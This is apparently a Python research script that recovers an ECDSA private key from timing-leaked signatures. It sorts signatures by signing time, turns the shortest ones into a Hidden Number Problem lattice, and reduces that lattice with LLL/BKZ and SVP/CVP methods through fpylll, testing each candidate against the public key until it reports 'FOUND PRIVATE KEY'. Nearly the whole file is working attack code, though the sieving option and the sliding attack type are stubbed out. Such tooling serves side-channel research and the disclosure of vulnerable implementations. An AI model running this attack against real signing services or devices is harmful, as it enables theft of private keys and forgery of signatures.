#!/usr/bin/env python3

import csv
import hashlib
import json
import random
import time
from binascii import unhexlify
from collections import namedtuple
from pprint import pprint
from threading import current_thread, Thread

from fpylll import LLL, BKZ, CVP, IntegerMatrix, GSO, Enumeration, Pruning, EnumerationError
#from g6k.siever import Siever
#from g6k.algorithms.bkz import pump_n_jump_bkz_tour as BKZ_Sieve
#from g6k.utils.stats import SieveTreeTracer
import numpy as np
from numpy.linalg import inv as matrix_inverse
from ec import get_curve, Mod

Signature = namedtuple("Signature", ("elapsed", "h", "t", "u"))

DEFAULT_PARAMS = {
    "attack": {
        "method": "svp",
        "type": "random",  #
        "skip": 50,  # How many signatures to skip at the start.
        "start": 2000,  # When to start creating the attack threads.
        "step": 200,  # After how many new signatures should a new thread be started.
        "num": 5000,  # Number of signatures used, (for the "random" and "sliding" types)
        "seed": None
    },
    "max_threads": 2,  # How many threads should be alive at any point.
    "pruning_radius": 100,
    # A multiplier of the "p^2 * sqrt(dim +1)" radius where the solution should be found.
    "dimension": 90,  # How many signatures are used for the lattice, real dimension is +1.
    "bounds": {  # Bounds on the MSB zero bits of the part of the minimal signatures.
        16: 8,  # 16-th: 6 zero bits
        8: 7,  # eight: 5 zero bits
        4: 5,  # quarter: 4 zero bits
        2: 4,  # half: 3 zero bits
        1: 3,  # all: 2 zero bits
    },
    "betas": [15, 20, 30, 40, 45, 48, 51, 53, 55],  # BKZ block size progression.
}


def construct_signature(curve, hash, data, r, s, elapsed):
    """Parse the signature into a Signature object."""
    h = hash.copy()
    h.update(data)
    data_hash = int(h.hexdigest(), 16)
    if h.digest_size * 8 > curve.group.n.bit_length():
        data_hash >>= h.digest_size * 8 - curve.group.n.bit_length()
    r = Mod(r, curve.group.n)
    s = Mod(s, curve.group.n)
    sinv = s.inverse()
    t = (sinv * r)
    u = (-sinv * data_hash)
    return Signature(elapsed, data_hash, int(t), int(u))


class Solver(Thread):
    """Solve the HNP given signatures and target pubkey."""

    def __init__(self, curve, signatures, pubkey, params, solution_func):
        super().__init__()
        self.curve = curve
        self.signatures = signatures
        self.pubkey = pubkey
        self.params = params
        self.solution_func = solution_func

    def bound_func(self, index, dim, bounds):
        max_bound = 0
        for part, bound in bounds.items():
            if index < dim / int(part) and max_bound < bound:
                max_bound = bound
        return max_bound + 1

    def build_cvp_lattice(self, signatures, dim, bounds):
        b = IntegerMatrix(dim + 1, dim + 1)
        for i in range(dim):
            b[i, i] = (2 ** self.bound_func(i, dim, bounds)) * self.curve.group.n
            b[dim, i] = (2 ** self.bound_func(i, dim, bounds)) * signatures[i][0]
        b[dim, dim] = 1
        return b

    def build_svp_lattice(self, signatures, dim, bounds):
        b = IntegerMatrix(dim + 2, dim + 2)
        for i in range(dim):
            b[i, i] = (2 ** self.bound_func(i, dim, bounds)) * self.curve.group.n
            b[dim, i] = (2 ** self.bound_func(i, dim, bounds)) * signatures[i][0]
            b[dim + 1, i] = (2 ** self.bound_func(i, dim, bounds)) * signatures[i][1]
        b[dim, dim] = 1
        b[dim + 1, dim + 1] = self.curve.group.n
        return b

    def build_target(self, signatures, dim, bounds):
        return [(2 ** self.bound_func(i, dim, bounds)) * signatures[i][1] for i in range(dim)] + [0]

    def log(self, msg):
        print("[{}] {} [{}s]".format(self.thread_name, msg, int(time.time() - self.thread_start)))

    def reduce_lattice(self, lattice, block_size):
        if block_size is None:
            self.log("Start LLL.")
            return LLL.reduction(lattice)
        else:
            if self.sieve:
                #self.log("Start sieving(BKZ-{}).".format(block_size))
                #g6k = Siever(lattice)
                #tracer = SieveTreeTracer(g6k, root_label=("bkz", block_size), start_clocks=True)
                #for _ in range(3):
                #    BKZ_Sieve(g6k, tracer, block_size)
                return lattice
            else:
                self.log("Start BKZ-{}.".format(block_size))
                return BKZ.reduction(lattice, BKZ.Param(block_size=block_size, strategies=BKZ.DEFAULT_STRATEGY, auto_abort=True))

    def pruning_radius_gso(self, lattice, multiplier, n_sols=1,
                           flags=Pruning.CVP | Pruning.GRADIENT | Pruning.SINGLE):
        self.log("Compute pruning.")
        Mat = GSO.Mat(lattice)
        Mat.update_gso()
        R = Mat.r()
        radius = self.curve.group.n ** 2 * (lattice.nrows + 1) * multiplier
        pruning = Pruning.run(radius, 2 ** 32, [R], n_sols, metric="solutions", flags=flags)
        return pruning, radius, Mat

    def vector_from_coeffs(self, coeffs, lattice):
        return tuple((IntegerMatrix.from_iterable(1, lattice.nrows,
                                                  map(lambda x: int(round(x)), coeffs)) * lattice)[
                         0])

    def babai(self, lattice, gso, target):
        self.log("Start Babai's Nearest Plane.")
        combs = gso.babai(target)
        return self.vector_from_coeffs(combs, lattice)

    def round(self, lattice, target):
        self.log("Start Babai's Rounding.")
        b = np.empty((lattice.nrows, lattice.ncols), "f8")
        lattice.to_matrix(b)
        b = matrix_inverse(b)
        res = np.dot(target, b)
        return self.vector_from_coeffs(res, lattice)

    def enumeration_cvp(self, lattice, gso, pruning, radius, target):
        self.log("Start Enumeration(CVP).")
        try:
            E = Enumeration(gso)
            enum = E.enumerate(0, lattice.nrows, radius, 0, gso.from_canonical(target),
                               pruning=pruning.coefficients)
            _, v1 = enum[0]
            return self.vector_from_coeffs(v1, lattice)
        except EnumerationError:
            self.log("No solution.")
            return None

    def closest_vector(self, lattice, target):
        self.log("Start CVP.")
        return CVP.closest_vector(lattice, target, flags=CVP.VERBOSE)

    def _try_guess(self, guess, pubkey):
        if guess in self.tried or -guess in self.tried:
            return False
        self.tried.add(guess)
        pubkey_guess = guess * self.curve.g
        self.log("Guess: {}".format(hex(guess)))
        if pubkey == pubkey_guess:
            self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        guess = self.curve.group.n - guess
        pubkey_guess = guess * self.curve.g
        if pubkey == pubkey_guess:
            self.solution_func(guess)
            self.log("*** FOUND PRIVATE KEY *** : {}".format(hex(guess)))
            return True
        return False

    def verify_shortest(self, lattice, pubkey):
        for row in lattice:
            guess = row[-2] % self.curve.group.n
            if self._try_guess(guess, pubkey):
                return True
        return False

    def verify_closest(self, closest, pubkey):
        if closest is None:
            return False
        guess = closest[-1] % self.curve.group.n
        return self._try_guess(guess, pubkey)

    def run(self):
        self.thread_name = current_thread().name
        if self.thread_name == "MainThread":
            self.thread_name = " "
        self.thread_start = time.time()
        self.tried = set()

        pairs = [(sig.t, sig.u) for sig in self.signatures]
        dim = len(pairs)

        bnds = [self.bound_func(i, dim, self.params["bounds"]) - 1 for i in range(dim)]
        info = sum(bnds)
        overhead = info / self.curve.bit_size()
        self.log("Building lattice with {} bits of information (overhead {:.2f}).".format(info,
                                                                                          overhead))

        self.svp = self.params["attack"]["method"] == "svp"
        #self.sieve = self.params["attack"]["method"] == "sieve"
        self.sieve = False
        self.cvp = self.params["attack"]["method"] == "cvp"

        if self.svp or self.sieve:
            lattice = self.build_svp_lattice(pairs, dim, self.params["bounds"])
        elif self.cvp:
            lattice = self.build_cvp_lattice(pairs, dim, self.params["bounds"])
            target = self.build_target(pairs, dim, self.params["bounds"])
        else:
            self.log("Bad method: {}".format(self.params["attack"]["method"]))
            return

        reds = [None] + self.params["betas"]
        for beta in reds:
            lattice = self.reduce_lattice(lattice, beta)
            gso = GSO.Mat(lattice)
            gso.update_gso()
            if (self.svp or self.sieve) and self.verify_shortest(lattice, self.pubkey):
                break
            if self.cvp:
                closest = self.round(lattice, target)
                if self.verify_closest(closest, self.pubkey):
                    break

                closest = self.babai(lattice, gso, target)
                if self.verify_closest(closest, self.pubkey):
                    break


def parse_params(fname):
    with open(fname) as f:
        return json.load(f)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("curve", help="What curve was used.")
    parser.add_argument("hash", help="What hash algorithm was used.")
    parser.add_argument("sigfile", help="CSV signature output file name.")
    parser.add_argument(
            "-p",
            "--params",
            help="A JSON file specifying attack parameters.",
            dest="params",
            type=parse_params,
            default=DEFAULT_PARAMS,
    )
    args = parser.parse_args()

    curve = get_curve(args.curve)
    if curve is None:
        print("[x] No curve found:", args.curve)
        exit(1)
    try:
        hash = hashlib.new(args.hash)
    except ValueError:
        print("[x] No hash algorithm found:", args.hash)
        exit(1)

    print("[*] Using parameters:")
    pprint(args.params)

    print("[ ] Loading signatures.")
    with open(args.sigfile) as sigfile:
        fline = sigfile.readline()[:-1].split(" ")
        pub = unhexlify(fline[0])
        data = unhexlify(fline[1])
        pubkey = curve.decode_point(pub)

        reader = csv.reader(sigfile)
        signatures = [
            construct_signature(curve, hash, data, int(row[0], 16), int(row[1], 16), int(row[2]))
            for row in reader]
    print("[*] Loaded {} signatures.".format(len(signatures)))

    if args.params["attack"]["skip"] is not None:
        print("[*] Skipping first {} signatures.".format(args.params["attack"]["skip"]))
        signatures = signatures[args.params["attack"]["skip"]:]

    if args.params["attack"]["type"] == "random" and args.params["attack"]["num"] < len(signatures):
        if args.params["attack"]["seed"] is None:
            seed = int(time.time() * 1000)
        else:
            seed = args.params["attack"]["seed"]
        print("[*] Random seed:", seed)
        random.seed(seed)
        signatures = random.sample(signatures, args.params["attack"]["num"])
    print("[*] Using {} signatures.".format(len(signatures)))

    if len(signatures) < args.params["attack"]["start"]:
        print("[x] The number of signatures is less than required by the parameters,"
              " the attack might not be successful.")

    found = False
    def solution(skey):
        global found
        found = True


    print("[ ] Starting attack.")
    if args.params["attack"]["type"] in ("full", "random"):
        signatures.sort()
        solver = Solver(curve, signatures[: args.params["dimension"]], pubkey, args.params,
                        solution)
        try:
            solver.run()
        except KeyboardInterrupt:
            pass
        print("[*] Finished attack.")
    elif args.params["attack"]["type"] == "sliding":
        pass
        # TODO run sliding attack here
        # using num_threads
    else:
        pass
    if not found:
        exit(1)
